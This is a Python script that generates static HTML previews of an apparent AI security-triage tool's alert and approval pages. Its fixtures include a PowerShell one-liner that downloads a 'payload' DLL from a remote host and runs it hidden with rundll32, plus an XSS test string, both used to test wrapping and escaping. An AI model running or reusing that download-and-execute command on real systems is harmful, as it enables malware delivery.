"""
UI/preview.py - Standalone Static HTML Preview Generator for Triagent

Usage:
    python -m UI.preview

Generates static, self-contained HTML files in UI/preview/ (git-ignored)
for every UI state in both Dark and Light mode.
Includes fixtures with very long command lines and XSS strings to verify
wrapping and escaping.
"""

from datetime import datetime, timezone, timedelta
import html
import json
import os
from pathlib import Path
import shutil

from UI.HITL.pages import (
    render_pending_list,
    render_tool_approval_page,
    render_continue_page,
    render_ask_user_page,
    render_expired_page,
    render_decided_page,
    render_not_found_page,
)


ROOT_DIR = Path(__file__).resolve().parent.parent
PREVIEW_DIR = ROOT_DIR / "UI" / "preview"
BRAND_DIR = ROOT_DIR / "UI" / "brand"
MAIN_STATIC_DIR = ROOT_DIR / "UI" / "main" / "static"
HITL_STATIC_DIR = ROOT_DIR / "UI" / "HITL" / "static"


# Sample Long Command and XSS string
LONG_COMMAND = (
    "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; "
    "(New-Object System.Net.WebClient).DownloadFile('https://edge-security-updates.azureedge.net/downloads/payload_stage2_x64_obfuscated_v3.dll?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkF0dGFja2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', "
    "'C:\\Users\\lilyb\\AppData\\Local\\Temp\\update_service_cache_x64.dll'); "
    "Start-Process rundll32.exe -ArgumentList 'C:\\Users\\lilyb\\AppData\\Local\\Temp\\update_service_cache_x64.dll,ServiceMainEntryPoint /silent' -WindowStyle Hidden\""
)
XSS_PAYLOAD = "<script>alert('XSS-TEST')</script><img src='x' onerror='alert(\"XSS-IMG\")'>"


def setup_preview_directories():
    """Create preview directory structure and copy brand + css assets."""
    PREVIEW_DIR.mkdir(parents=True, exist_ok=True)
    (PREVIEW_DIR / "brand").mkdir(exist_ok=True)
    (PREVIEW_DIR / "static").mkdir(exist_ok=True)

    # Copy brand assets
    for item in BRAND_DIR.glob("*"):
        if item.is_file() and not item.name.endswith(".zip"):
            shutil.copy2(item, PREVIEW_DIR / "brand" / item.name)

    # Copy hitl.css and app.css
    shutil.copy2(HITL_STATIC_DIR / "hitl.css", PREVIEW_DIR / "static" / "hitl.css")
    shutil.copy2(MAIN_STATIC_DIR / "app.css", PREVIEW_DIR / "static" / "app.css")
    shutil.copy2(MAIN_STATIC_DIR / "app.js", PREVIEW_DIR / "static" / "app.js")


def make_relative(html_str: str, data_theme: str | None = None) -> str:
    """Rewrite root URLs to relative URLs and optionally inject data-theme for light mode."""
    content = html_str.replace('href="/brand/', 'href="brand/')
    content = content.replace('src="/brand/', 'src="brand/')
    content = content.replace('srcset="/brand/', 'srcset="brand/')
    content = content.replace('href="/static/', 'href="static/')
    content = content.replace('src="/static/', 'src="static/')

    if data_theme:
        content = content.replace('<html lang="en">', f'<html lang="en" data-theme="{data_theme}">')
    return content


def generate_hitl_previews():
    """Generate all HITL page previews."""
    now = datetime.now(timezone.utc)
    exp_in_10 = (now + timedelta(minutes=10)).isoformat()
    exp_past = (now - timedelta(minutes=5)).isoformat()

    # 1. Pending Empty
    html_empty = render_pending_list([])
    (PREVIEW_DIR / "hitl_pending_empty.html").write_text(make_relative(html_empty), encoding="utf-8")
    (PREVIEW_DIR / "hitl_pending_empty-light.html").write_text(make_relative(html_empty, "light"), encoding="utf-8")

    # 2. Pending With Items
    pending_items = [
        {
            "request_id": "req-kill-01",
            "token": "tok_kill_01",
            "kind": "tool_approval",
            "expires_at": exp_in_10,
            "payload": {
                "alert_title": f"Suspicious Encoded PowerShell {XSS_PAYLOAD}",
                "tool_name": "kill_process",
            },
        },
        {
            "request_id": "req-ask-02",
            "token": "tok_ask_02",
            "kind": "ask_user",
            "expires_at": exp_in_10,
            "payload": {
                "alert_title": "Did you download Invoice_Payment_Due.pdf.exe?",
            },
        },
        {
            "request_id": "req-cont-03",
            "token": "tok_cont_03",
            "kind": "continue_turns",
            "expires_at": exp_in_10,
            "payload": {
                "alert_title": "Turn Limit Reached (Investigation quota exceeded)",
            },
        },
    ]
    html_items = render_pending_list(pending_items)
    (PREVIEW_DIR / "hitl_pending_items.html").write_text(make_relative(html_items), encoding="utf-8")
    (PREVIEW_DIR / "hitl_pending_items-light.html").write_text(make_relative(html_items, "light"), encoding="utf-8")

    # 3. Kill Approval (LIVE)
    req_kill_live = {
        "request_id": "req-live-01",
        "token": "tok-live",
        "thread_id": "thread-a1-sim",
        "expires_at": exp_in_10,
        "payload": {
            "alert_title": f"Mimikatz Credential Dumping Attempt {XSS_PAYLOAD}",
            "severity": "HIGH",
            "tool_name": "kill_process",
            "target": "powershell.exe (PID 4812, GUID {11111111-2222-3333-4444-555555555555})",
            "reason": f"Process spawned from malicious macro and attempted LSASS memory injection. {XSS_PAYLOAD}",
            "approval_screen": f"TARGET PROCESS:\n  Command: {LONG_COMMAND}\n  Parent: winword.exe (PID 3104)\n\n[!] ACTION: Permanent termination of PID 4812",
        },
    }
    html_kill_live = render_tool_approval_page(req_kill_live, dry_run=False)
    (PREVIEW_DIR / "hitl_kill_normal.html").write_text(make_relative(html_kill_live), encoding="utf-8")
    (PREVIEW_DIR / "hitl_kill_normal-light.html").write_text(make_relative(html_kill_live, "light"), encoding="utf-8")

    # 4. Kill Approval (DRY RUN)
    html_kill_dryrun = render_tool_approval_page(req_kill_live, dry_run=True)
    (PREVIEW_DIR / "hitl_kill_dryrun.html").write_text(make_relative(html_kill_dryrun), encoding="utf-8")
    (PREVIEW_DIR / "hitl_kill_dryrun-light.html").write_text(make_relative(html_kill_dryrun, "light"), encoding="utf-8")

    # 5. Quarantine Approval
    req_quarantine = {
        "request_id": "req-quar-01",
        "token": "tok-quar",
        "thread_id": "thread-a1-sim",
        "expires_at": exp_in_10,
        "payload": {
            "alert_title": "Trojan Downloader Executable",
            "severity": "CRITICAL",
            "tool_name": "quarantine_file",
            "target": "C:\\Users\\lilyb\\Downloads\\Invoice_Payment_Due.pdf.exe",
            "reason": "SHA256 97AC98B1A92C286054CCE55239CFCCDFC23A5517BD07FE693072C9CA96C7DABB dropped persistence script svchost_updater.bat.",
            "approval_screen": "FILE DETAILS:\n  Path: C:\\Users\\lilyb\\Downloads\\Invoice_Payment_Due.pdf.exe\n  Size: 450,560 bytes\n  Entropy: 7.91 (Packed)\n\nACTION: Move to .\\quarantine\\ and deny execution rights via icacls.",
        },
    }
    html_quar = render_tool_approval_page(req_quarantine, dry_run=False)
    (PREVIEW_DIR / "hitl_quarantine.html").write_text(make_relative(html_quar), encoding="utf-8")
    (PREVIEW_DIR / "hitl_quarantine-light.html").write_text(make_relative(html_quar, "light"), encoding="utf-8")

    # 6. Continue Page
    req_continue = {
        "request_id": "req-cont-01",
        "token": "tok-cont",
        "thread_id": "thread-a1-sim",
        "expires_at": exp_in_10,
        "payload": {
            "turns": 5,
            "turn_limit": 5,
            "continues": 0,
            "max_continues": 3,
            "plan": [
                "Reconstruct full child process tree from process GUID",
                "Inspect registry run keys for persistence entries",
                "Quarantine dropped files in Temp directory",
                f"Formulate final incident verdict {XSS_PAYLOAD}",
            ],
            "tools_used": ["get_events_for_process", "get_file_info", "query_threat_intel"],
            "last_message": f"Investigated process GUID {{11111111-2222-3333-4444-555555555555}}. Identified suspicious Run key creation. Quota reached. Requesting additional 5 turns to complete registry containment.\n\nCommand executed: {LONG_COMMAND}",
        },
    }
    html_cont = render_continue_page(req_continue)
    (PREVIEW_DIR / "hitl_continue.html").write_text(make_relative(html_cont), encoding="utf-8")
    (PREVIEW_DIR / "hitl_continue-light.html").write_text(make_relative(html_cont, "light"), encoding="utf-8")

    # 7. Ask User Page
    req_ask = {
        "request_id": "req-ask-01",
        "token": "tok-ask",
        "expires_at": exp_in_10,
        "payload": {
            "question": f"Did you intend to download and run Invoice_Payment_Due.pdf.exe from edge-security-updates.azureedge.net? {XSS_PAYLOAD}",
            "choices": [
                "Yes, this was an expected accounting invoice.",
                "No, I never downloaded this invoice file.",
                "I am testing a simulation attack script.",
            ],
            "system_context": f"File: C:\\Users\\lilyb\\Downloads\\Invoice_Payment_Due.pdf.exe\nTimestamp: 2026-11-01 10:45:00 UTC\nUser: lilyb\nURL: https://edge-security-updates.azureedge.net/downloads/invoice.exe\nCommand: {LONG_COMMAND}",
        },
    }
    html_ask = render_ask_user_page(req_ask)
    (PREVIEW_DIR / "hitl_ask_user.html").write_text(make_relative(html_ask), encoding="utf-8")
    (PREVIEW_DIR / "hitl_ask_user-light.html").write_text(make_relative(html_ask, "light"), encoding="utf-8")

    # 8. Expired Page
    req_exp = {
        "request_id": "req-exp-01",
        "expires_at": exp_past,
    }
    html_exp = render_expired_page(req_exp)
    (PREVIEW_DIR / "hitl_expired.html").write_text(make_relative(html_exp), encoding="utf-8")
    (PREVIEW_DIR / "hitl_expired-light.html").write_text(make_relative(html_exp, "light"), encoding="utf-8")

    # 9. Recorded / Decided Page
    req_decided = {
        "request_id": "req-dec-01",
        "decision": "approved",
        "note": "Approved by incident response analyst on duty.",
        "decided_at": "2026-11-01 11:20:00 UTC",
    }
    html_dec = render_decided_page(req_decided, "The process has been terminated.")
    (PREVIEW_DIR / "hitl_recorded.html").write_text(make_relative(html_dec), encoding="utf-8")
    (PREVIEW_DIR / "hitl_recorded-light.html").write_text(make_relative(html_dec, "light"), encoding="utf-8")

    # 10. Not Found Page
    html_404 = render_not_found_page("non-existent-request-id")
    (PREVIEW_DIR / "hitl_not_found.html").write_text(make_relative(html_404), encoding="utf-8")
    (PREVIEW_DIR / "hitl_not_found-light.html").write_text(make_relative(html_404, "light"), encoding="utf-8")


def generate_main_previews():
    """Generate static preview pages for UI/main with fixture data."""
    index_html = (MAIN_STATIC_DIR / "index.html").read_text(encoding="utf-8")

    threads_fixture = [
        {
            "thread_id": "thread-01-attack",
            "title": f"Mimikatz Credential Dumping {XSS_PAYLOAD}",
            "level": "high",
            "status": "done",
            "verdict": "true_positive",
            "host": "WORKSTATION-01",
            "user": "lilyb",
            "updated_at": datetime.now(timezone.utc).isoformat(),
        },
        {
            "thread_id": "thread-02-waiting",
            "title": "Quarantine File Approval Needed",
            "level": "critical",
            "status": "waiting_human",
            "verdict": None,
            "host": "FINANCE-PC",
            "user": "alice",
            "updated_at": (datetime.now(timezone.utc) - timedelta(minutes=4)).isoformat(),
        },
        {
            "thread_id": "thread-03-working",
            "title": "Active Living-Off-The-Land Investigation",
            "level": "medium",
            "status": "working",
            "verdict": None,
            "host": "SERVER-SQL02",
            "user": "dbadmin",
            "updated_at": (datetime.now(timezone.utc) - timedelta(minutes=1)).isoformat(),
        },
        {
            "thread_id": "thread-04-safe",
            "title": "Scheduled Task Registration: Dell SupportAssist",
            "level": "low",
            "status": "done",
            "verdict": "false_positive",
            "host": "LAPTOP-OFFICE",
            "user": "SYSTEM",
            "updated_at": (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat(),
        },
        {
            "thread_id": "thread-05-unsure",
            "title": "PowerShell Script With Encoded Parameter",
            "level": "medium",
            "status": "done",
            "verdict": "needs_more_info",
            "host": "DEV-BUILD01",
            "user": "jenkins",
            "updated_at": (datetime.now(timezone.utc) - timedelta(hours=5)).isoformat(),
        },
    ]

    # Detail items for Real Attack
    attack_detail = {
        "thread": threads_fixture[0],
        "run": {"state": "idle"},
        "items": [
            {
                "id": "item-alert-01",
                "type": "alert",
                "title": f"Mimikatz Credential Access Via LSASS Memory Injection {XSS_PAYLOAD}",
                "level": "high",
                "host": "WORKSTATION-01",
                "user": "lilyb",
                "process_name": "powershell.exe",
                "command_line": LONG_COMMAND,
                "raw_alert": f"{{\"EventID\": 10, \"TargetImage\": \"C:\\\\Windows\\\\System32\\\\lsass.exe\", \"GrantedAccess\": \"0x1010\", \"XSS\": \"{XSS_PAYLOAD}\"}}",
            },
            {
                "id": "item-plan-02",
                "type": "plan",
                "steps": [
                    "Query process ancestry and process command lines",
                    "Check network connections for payload host azureedge.net",
                    "Verify dropped persistence scripts in Temp folder",
                    "Terminate offending process and quarantine payload",
                ],
            },
            {
                "id": "item-tool-03",
                "type": "tool",
                "tool_name": "get_events_for_process",
                "status": "ok",
                "args": {"process_guid": "{11111111-2222-3333-4444-555555555555}"},
                "result_preview": "Found 14 Sysmon events: Event 1 (ProcessCreate), Event 11 (FileCreate: svchost_updater.bat), Event 13 (Registry: Run/SystemUpdaterService).",
                "result_full": "Event 1: powershell.exe spawned from winword.exe\nEvent 11: svchost_updater.bat written to C:\\Users\\lilyb\\AppData\\Local\\Temp\nEvent 13: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdaterService -> C:\\Users\\lilyb\\AppData\\Local\\Temp\\svchost_updater.bat",
            },
            {
                "id": "item-action-04",
                "type": "action",
                "tool_name": "kill_process",
                "target": "powershell.exe (PID 4812)",
                "decision": "approved",
                "reason": "Process executed malicious in-memory downloader payload.",
            },
            {
                "id": "item-chat-05",
                "type": "chat_bubble",
                "sender": "user",
                "text": "Did the script successfully dump any credentials before termination?",
            },
            {
                "id": "item-chat-06",
                "type": "chat_bubble",
                "sender": "agent",
                "text": "No. Sysmon Event 10 indicates LSASS handle access was requested but process termination was approved before memory read handles completed. The persistence registry key has also been flagged for containment.",
            },
            {
                "id": "item-verdict-07",
                "type": "verdict",
                "verdict": "true_positive",
                "headline_badge": "Real attack",
                "severity": "high",
                "confidence": "high",
                "category": "Credential Access & Persistence",
                "summary": "Confirmed malicious PowerShell execution attempting LSASS memory dump and installing startup persistence.",
                "explanation": "The alert is a true positive. A malicious Word document downloaded Invoice_Payment_Due.pdf.exe which spawned an obfuscated PowerShell payload. The script attempted to access LSASS and created a Run key in the registry.",
                "evidence": [
                    {
                        "direction": "suspicious",
                        "finding": "Obfuscated PowerShell command downloading secondary payload DLL from untrusted host",
                        "source_tool": "get_events_for_process",
                    },
                    {
                        "direction": "suspicious",
                        "finding": "Persistence registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdaterService created",
                        "source_tool": "get_events_for_process",
                    },
                    {
                        "direction": "benign",
                        "finding": "Host AV signatures up to date and host rebooted cleanly",
                        "source_tool": "get_system_info",
                    },
                ],
                "assumptions": [
                    "Assumed edge-security-updates.azureedge.net is an external staging endpoint",
                ],
                "not_checked": [
                    "Did not inspect encrypted network traffic on wire",
                ],
                "recommended_next_steps": [
                    "Remove registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdaterService",
                    "Delete dropped script C:\\Users\\lilyb\\AppData\\Local\\Temp\\svchost_updater.bat",
                    "Reset credentials for user account lilyb",
                ],
                "threat_active": "No (Process terminated, payload neutralized)",
                "remaining_risk": "Residual persistence batch file requires deletion",
                "footer": {
                    "duration_seconds": 18.4,
                    "turns": 4,
                    "tool_count": 6,
                },
                "revision": 1,
            },
        ],
    }

    # Detail items for False Alarm
    safe_detail = {
        "thread": threads_fixture[3],
        "run": {"state": "idle"},
        "items": [
            {
                "id": "item-alert-safe",
                "type": "alert",
                "title": "Scheduled Task Created By SYSTEM",
                "level": "low",
                "host": "LAPTOP-OFFICE",
                "user": "SYSTEM",
                "process_name": "schtasks.exe",
                "command_line": "schtasks.exe /create /tn \"Dell\\SupportAssist\\AgentUpdate\" /tr \"C:\\Program Files\\Dell\\SupportAssist\\SupportAssistAgent.exe\" /sc DAILY",
            },
            {
                "id": "item-verdict-safe",
                "type": "verdict",
                "verdict": "false_positive",
                "headline_badge": "False alarm",
                "severity": "low",
                "confidence": "high",
                "category": "Legitimate Administrative Activity",
                "summary": "Legitimate Dell SupportAssist routine updater task registration.",
                "explanation": "Binary is signed by Dell Inc. with valid Authenticode certificate. Path matches standard vendor installation directory. No anomalous network connections observed.",
                "evidence": [
                    {
                        "direction": "benign",
                        "finding": "Binary signature verified: Dell Inc. valid certificate",
                        "source_tool": "get_file_info",
                    },
                    {
                        "direction": "benign",
                        "finding": "Parent process is signed Dell update installer",
                        "source_tool": "get_events_for_process",
                    },
                ],
                "benign_explanation": "Vendor automatic software maintenance routine.",
                "recommended_next_steps": [
                    "Tune Sigma rule to exclude Dell SupportAssist updater binaries in standard Program Files paths",
                ],
                "footer": {
                    "duration_seconds": 6.2,
                    "turns": 2,
                    "tool_count": 3,
                },
                "revision": 1,
            },
        ],
    }

    # Detail items for Needs More Info with Superseded Revision
    unsure_detail = {
        "thread": threads_fixture[4],
        "run": {"state": "idle"},
        "items": [
            {
                "id": "item-verdict-rev1",
                "type": "verdict",
                "verdict": "needs_more_info",
                "headline_badge": "Needs more info",
                "severity": "medium",
                "confidence": "low",
                "category": "Inconclusive Automation Script",
                "summary": "Initial evaluation inconclusive due to missing endpoint telemetry.",
                "explanation": "Could not determine if build server script execution was developer authorized.",
                "superseded": True,
                "revision": 1,
                "footer": {"duration_seconds": 8.0, "turns": 2, "tool_count": 2},
            },
            {
                "id": "item-verdict-rev2",
                "type": "verdict",
                "verdict": "needs_more_info",
                "headline_badge": "Needs more info",
                "severity": "medium",
                "confidence": "medium",
                "category": "Administrative Developer Tooling",
                "summary": "Script appears to be Jenkins CI pipeline step, but target network share was unreachable.",
                "explanation": "The script decoded an internal deployment target path. However, offline status of internal file server prevented hash verification.",
                "evidence": [
                    {
                        "direction": "neutral",
                        "finding": "Encoded base64 string contained internal repository path //internal-git/build",
                        "source_tool": "get_events_for_process",
                    },
                ],
                "missing_info": "Reachability to internal audit server for deployment hash validation.",
                "recommended_next_steps": [
                    "Contact developer or inspect Jenkins build job #4812 console log",
                ],
                "footer": {"duration_seconds": 14.5, "turns": 4, "tool_count": 5},
                "revision": 2,
            },
        ],
    }

    # Helper script generator for preview files
    def make_main_preview_html(detail_data, data_theme=None, initial_thread="thread-01-attack"):
        mock_script = f"""
<script>
window.__PREVIEW_THREADS__ = {json.dumps(threads_fixture)};
window.__PREVIEW_DETAIL__ = {json.dumps(detail_data)};

const origFetch = window.fetch;
window.fetch = async function(url, opts) {{
    const urlStr = String(url);
    if (urlStr.includes('/api/threads/') && !urlStr.endsWith('/api/threads')) {{
        return {{
            ok: true,
            status: 200,
            json: async () => window.__PREVIEW_DETAIL__
        }};
    }}
    if (urlStr.endsWith('/api/threads')) {{
        return {{
            ok: true,
            status: 200,
            json: async () => window.__PREVIEW_THREADS__
        }};
    }}
    return origFetch.apply(this, arguments);
}};
window.location.hash = '#/thread/{initial_thread}';
</script>
"""
        rel_html = make_relative(index_html, data_theme)
        # Inject mock script right before app.js
        return rel_html.replace('<script src="static/app.js"></script>', f'{mock_script}\n<script src="static/app.js"></script>')

    # 1. Main Timeline Attack
    html_attack = make_main_preview_html(attack_detail, None, "thread-01-attack")
    (PREVIEW_DIR / "main_timeline_attack.html").write_text(html_attack, encoding="utf-8")
    html_attack_light = make_main_preview_html(attack_detail, "light", "thread-01-attack")
    (PREVIEW_DIR / "main_timeline_attack-light.html").write_text(html_attack_light, encoding="utf-8")

    # 2. Main False Alarm
    html_safe = make_main_preview_html(safe_detail, None, "thread-04-safe")
    (PREVIEW_DIR / "main_verdict_safe.html").write_text(html_safe, encoding="utf-8")
    html_safe_light = make_main_preview_html(safe_detail, "light", "thread-04-safe")
    (PREVIEW_DIR / "main_verdict_safe-light.html").write_text(html_safe_light, encoding="utf-8")

    # 3. Main Needs More Info (with Superseded Revision)
    html_unsure = make_main_preview_html(unsure_detail, None, "thread-05-unsure")
    (PREVIEW_DIR / "main_verdict_unsure.html").write_text(html_unsure, encoding="utf-8")
    html_unsure_light = make_main_preview_html(unsure_detail, "light", "thread-05-unsure")
    (PREVIEW_DIR / "main_verdict_unsure-light.html").write_text(html_unsure_light, encoding="utf-8")

    # 4. Main Empty State
    empty_mock_script = f"""
<script>
window.__PREVIEW_THREADS__ = [];
window.fetch = async function(url, opts) {{
    return {{ ok: true, status: 200, json: async () => [] }};
}};
window.location.hash = '';
</script>
"""
    rel_empty = make_relative(index_html, None).replace('<script src="static/app.js"></script>', f'{empty_mock_script}\n<script src="static/app.js"></script>')
    (PREVIEW_DIR / "main_empty.html").write_text(rel_empty, encoding="utf-8")
    rel_empty_light = make_relative(index_html, "light").replace('<script src="static/app.js"></script>', f'{empty_mock_script}\n<script src="static/app.js"></script>')
    (PREVIEW_DIR / "main_empty-light.html").write_text(rel_empty_light, encoding="utf-8")


def generate_index_dashboard():
    """Generate index.html inside UI/preview/ linking to all generated preview pages."""
    pages = [
        ("HITL Dashboard - Empty", "hitl_pending_empty.html", "hitl_pending_empty-light.html"),
        ("HITL Dashboard - With Items (Amber element)", "hitl_pending_items.html", "hitl_pending_items-light.html"),
        ("HITL Action Approval - LIVE Execution", "hitl_kill_normal.html", "hitl_kill_normal-light.html"),
        ("HITL Action Approval - DRY RUN Notice", "hitl_kill_dryrun.html", "hitl_kill_dryrun-light.html"),
        ("HITL File Quarantine Approval", "hitl_quarantine.html", "hitl_quarantine-light.html"),
        ("HITL Continue Investigation Prompt", "hitl_continue.html", "hitl_continue-light.html"),
        ("HITL Question For User (ask_user)", "hitl_ask_user.html", "hitl_ask_user-light.html"),
        ("HITL Recorded Confirmation", "hitl_recorded.html", "hitl_recorded-light.html"),
        ("HITL Request Expired", "hitl_expired.html", "hitl_expired-light.html"),
        ("HITL Not Found (404)", "hitl_not_found.html", "hitl_not_found-light.html"),
        ("Main UI - Real Attack Verdict & Timeline", "main_timeline_attack.html", "main_timeline_attack-light.html"),
        ("Main UI - False Alarm Verdict", "main_verdict_safe.html", "main_verdict_safe-light.html"),
        ("Main UI - Needs More Info & Superseded Revision", "main_verdict_unsure.html", "main_verdict_unsure-light.html"),
        ("Main UI - Empty State (Calm & Centered)", "main_empty.html", "main_empty-light.html"),
    ]

    rows = []
    for title, dark_file, light_file in pages:
        rows.append(
            f'<tr>'
            f'<td><strong>{html.escape(title)}</strong></td>'
            f'<td><a href="{dark_file}" target="_blank">Dark Mode (Default)</a></td>'
            f'<td><a href="{light_file}" target="_blank">Light Mode</a></td>'
            f'</tr>'
        )

    content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Triagent UI Previews - All States</title>
    <link rel="icon" type="image/svg+xml" href="brand/triagent-icon.svg">
    <link rel="stylesheet" href="brand/theme.css">
    <link rel="stylesheet" href="static/hitl.css">
</head>
<body>
    <div class="container" style="max-width: 900px;">
        <header class="topbar">
            <picture class="brand-lockup">
                <source media="(prefers-color-scheme: light)" srcset="brand/triagent-lockup-light.svg">
                <img src="brand/triagent-lockup-dark.svg" alt="Triagent" width="160" height="36">
            </picture>
        </header>
        <main>
            <div class="eyebrow needs-you">Static Preview Gallery</div>
            <h1>Triagent UI Component & Page Previews</h1>
            <p class="lead">All states rendered offline from realistic fixtures (including long command-lines and XSS payloads) in both Dark and Light modes.</p>

            <table style="width: 100%; border-collapse: collapse; margin-top: 24px;">
                <thead>
                    <tr style="text-align: left; border-bottom: 2px solid var(--border);">
                        <th style="padding: 12px 8px;">Page / Component State</th>
                        <th style="padding: 12px 8px;">Dark Mode</th>
                        <th style="padding: 12px 8px;">Light Mode</th>
                    </tr>
                </thead>
                <tbody>
                    {''.join(rows)}
                </tbody>
            </table>
        </main>
    </div>
</body>
</html>"""
    (PREVIEW_DIR / "index.html").write_text(content, encoding="utf-8")


def main():
    print("[*] Generating Triagent static previews...")
    setup_preview_directories()
    generate_hitl_previews()
    generate_main_previews()
    generate_index_dashboard()
    print(f"[+] Successfully generated static previews in: {PREVIEW_DIR}")
    print(f"[+] Open {PREVIEW_DIR / 'index.html'} in any browser to review all states.")


if __name__ == "__main__":
    main()
